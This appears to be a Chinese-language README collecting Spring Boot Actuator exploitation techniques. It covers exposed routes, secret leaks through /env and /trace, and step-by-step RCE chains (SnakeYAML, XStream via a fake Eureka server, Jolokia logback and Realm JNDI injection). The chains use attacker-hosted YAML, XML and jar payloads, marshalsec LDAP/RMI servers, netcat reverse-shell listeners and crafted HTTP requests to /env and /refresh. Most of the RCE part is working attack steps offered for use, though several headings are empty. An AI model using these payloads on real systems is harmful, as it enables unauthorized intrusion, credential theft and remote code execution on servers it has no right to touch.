# Spring Boot Vulnerability Exploit

SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 checklist



## 零：路由知识

- Spring 1.x 版本根路径以  `/` 开始，2.x 统一以 `/actuator` 作为根路径
- 有些程序员会自定义 `/manage`、`/management` 或 **项目相关名称** 为根路径
- 默认路由名字，如 `/env` 有时候也会被程序员修改，如修改成 `/appenv`





## 一：信息泄露

### 0x01：路由地址及接口调用详情泄漏

> 开发环境切换为线上生产环境时，相关人员没有更改配置文件或忘记切换配置环境，导致此漏洞
>



直接访问以下几个路由，验证漏洞是否存在：

```
/api-docs
/v2/api-docs
/swagger-ui.html
```

一些可能会遇到的接口路由变形：

```
/api.html
/sw/swagger-ui.html
/api/swagger-ui.html
/template/swagger-ui.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
```



除此之外，下面的路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：

```
/mappings
/actuator/mappings
/metrics
/actuator/metrics
/beans
/actuator/beans
/configprops
/actuator/configprops
```



**一般来讲，知道 springboot 应用的相关接口和传参信息并不能算是漏洞**；

但是可以检查暴露的接口是否存在未授权访问、越权或者其他业务型漏洞。



### 0x02：配置不当而暴露的路由

> 主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置



参考 [production-ready-endpoints](https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints) ，可能因为配置不当而暴露的路由主要有：

```
/actuator
/auditevents
/autoconfig
/beans
/caches
/conditions
/configprops
/docs
/dump
/env
/flyway
/health
/heapdump
/httptrace
/info
/intergrationgraph
/jolokia
/logfile
/loggers
/liquibase
/metrics
/mappings
/prometheus
/refresh
/scheduledtasks
/sessions
/shutdown
/trace
/threaddump
```



其中对寻找漏洞比较重要接口的有：

- /env

  GET 请求 `/env` 会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范 (例如 password 写成 psasword) 时，会泄露密码明文；

  同时有一定概率可以通过 POST 请求 `/env` 接口设置一些属性，触发相关 RCE 漏洞。

- /jolokia

  通过 `/jolokia/list` 接口寻找可以利用的 MBean，触发相关 RCE 漏洞；

- /trace

  一些 http 请求包访问跟踪信息，有可能发现有效的 cookie 信息



### 0x03：获取星号填充的密码明文





## 二：远程代码执行

> 由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准



### 0x01：SpEL RCE



### 0x02：spring cloud SnakeYAML RCE

#### **利用条件：**

- 可以 POST 请求目标网站的 `/env` 接口设置属性
- 可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 spring-boot-starter-actuator 组件）
- 目标使用了 spring-cloud 相关组件
- 目标可以请求攻击者的 HTTP 服务器（请求可出外网）



#### **利用方法：**

##### 步骤一： 托管 yml 和 jar 文件

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```bash
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```



在网站根目录下放置后缀为 `yml` 的文件  `example.yml`，内容如下：

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://your-vps-ip/example.jar"]
  ]]
]
```



在网站根目录下放置后缀为 `jar` 的文件  `example.jar`，内容是要执行的代码，代码编写及编译方式参考 [yaml-payload](https://github.com/artsploit/yaml-payload)。



##### 步骤二： 设置 spring.cloud.bootstrap.location 属性

spring 1.x

```
POST /env HTTP/1.1
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
```

spring 2.x

```
POST /actuator/env HTTP/1.1
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/example.yml"}
```



##### 步骤三： 刷新配置

spring 1.x

```
POST /refresh HTTP/1.1
Content-Type: application/x-www-form-urlencoded

```

spring 2.x

```
POST /actuator/refresh HTTP/1.1
Content-Type: application/json

```



#### **漏洞原理：**

1. spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址
2. refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容
3. SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作
4. 先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件
5. 然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化
6. 实例化类时执行恶意代码，造成 RCE 漏洞



#### 漏洞分析：

​	[Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记](https://www.anquanke.com/post/id/195929)





### 0x03：XStream deserialization RCE

#### **利用条件：**

- 可以 POST 请求目标网站的 `/env` 接口设置属性
- 可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 spring-boot-starter-actuator 组件）
- 目标使用了 `Eureka-Client < 1.8.7`（通常包含在 spring-cloud-starter-netflix-eureka-client 中）组件
- 目标可以请求攻击者的 HTTP 服务器（请求可出外网）



#### **利用方法：**

##### 步骤一：架设响应恶意 XStream payload 的网站

提供一个依赖 Flask 并符合要求的 [python 脚本示例](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py)，作用是利用目标 Linux 机器上自带的 python 来反弹shell。

使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。



##### 步骤二：监听反弹 shell 的端口

一般使用 nc 监听端口，等待反弹 shell

```bash
nc -lvp 443
```



##### 步骤三：设置 eureka.client.serviceUrl.defaultZone 属性

spring 1.x

```
POST /env HTTP/1.1
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
```

spring 2.x

```
POST /actuator/env HTTP/1.1
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/example"}
```



##### 步骤四：刷新配置

spring 1.x

```
POST /refresh HTTP/1.1
Content-Type: application/x-www-form-urlencoded

```

spring 2.x

```
POST /actuator/refresh HTTP/1.1
Content-Type: application/json

```



#### **漏洞原理：**

1. eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址
2. refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload
3. 目标机器相关组件解析 payload，触发 XStream 反序列化，造成 RCE 漏洞



#### **漏洞分析：**

​	[Spring Boot Actuator从未授权访问到getshell](https://www.freebuf.com/column/234719.html)





### 0x04：Jolokia logback JNDI RCE

#### **利用条件：**

- 目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
- 目标使用了 jolokia-core 组件（版本要求暂未知）并且环境中存在相关 MBean
- 目标可以请求攻击者的 HTTP 服务器（请求可出外网）

- ldap 注入可能会受目标 JDK 版本影响，jdk < 6u201/7u191/8u182/11.0.1



#### **利用方法：**

##### 步骤一：查看已存在的 MBeans

访问 `/jolokia/list` 接口，查看是否存在 `ch.qos.logback.classic.jmx.JMXConfigurator` 和 `reloadByURL` 关键词。



##### 步骤二：托管 xml 文件

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```bash
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```



在根目录放置以 `xml` 结尾的 `example.xml`  文件，内容如下：

```xml
<configuration>
  <insertFromJNDI env-entry-name="ldap://your-vps-ip:1389/JNDIObject" as="appName" />
</configuration>
```



##### 步骤三：准备要执行的 Java 代码

编写优化过后的用来反弹 shell 的 [Java 示例代码](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java)  `JNDIObject.java`，

使用兼容低版本 jdk 的方式编译：

```bash
javac -source 1.5 -target 1.5 JNDIObject.java
```

然后将生成的 `JNDIObject.class` 文件拷贝到 **步骤二** 中的网站根目录。



##### 步骤四：架设恶意 ldap 服务

下载 [marshalsec](https://github.com/mbechler/marshalsec) ，使用下面命令架设对应的 ldap 服务：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
```



##### 步骤五：监听反弹 shell 的端口

一般使用 nc 监听端口，等待反弹 shell

```bash
nc -lvp 443
```



##### 步骤六：从外部 URL 地址加载日志配置文件

替换实际的 your-vps-ip 地址访问 URL 触发漏洞：

```
/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml
```



#### **漏洞原理：**

1. 直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 `ch.qos.logback.classic.jmx.JMXConfigurator` 类的 `reloadByURL` 方法
2. 目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容
3. 目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)
4. xml 文件中利用 logback 组件的 `insertFormJNDI` 标签，设置了外部 JNDI 服务器地址
5. 目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞



#### **漏洞分析：**

​	[spring boot actuator rce via jolokia](https://xz.aliyun.com/t/4258)





### 0x05：Jolokia Realm JNDI RCE

#### **利用条件：**

- 目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
- 目标使用了 jolokia-core 组件（版本要求暂未知）并且环境中存在相关 MBean
- 目标可以请求攻击者的 HTTP 服务器（请求可出外网）
- 实际测试 RMI 注入受目标 JDK 版本影响，jdk < 6u141/7u131/8u121



#### **利用方法：**

##### 步骤一：查看已存在的 MBeans

访问 `/jolokia/list` 接口，查看是否存在 `type=MBeanFactory` 和 `createJNDIRealm` 关键词。



##### 步骤二：准备要执行的 Java 代码

编写优化过后的用来反弹 shell 的 [Java 示例代码](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java)  `JNDIObject.java`。



##### 步骤三：架设恶意 rmi 服务

下载 [marshalsec](https://github.com/mbechler/marshalsec) ，使用下面命令架设对应的 rmi 服务：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389
```



##### 步骤四：监听反弹 shell 的端口

一般使用 nc 监听端口，等待反弹 shell

```bash
nc -lvp 443
```



##### 步骤五：发送恶意 payload

根据实际情况修改 [springboot-realm-jndi-rce.py](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py) 脚本中的目标地址，RMI 地址、端口等信息，使用 python 在自己控制的服务器上运行以上的脚本即可。



#### **漏洞原理：**

1. 利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm
2. 设置 connectionURL 地址为 RMI Service URL
3. 设置 contextFactory 为 RegistryContextFactory
4. 停止 Realm
5. 启动 Realm 以触发指定 RMI 地址的  JNDI 注入，造成 RCE 漏洞



#### **漏洞分析：**

​	[Yet Another Way to Exploit Spring Boot Actuators via Jolokia](https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html)



### 0x06：h2 database query RCE





### 0x07：jdbc url deserialization RCE




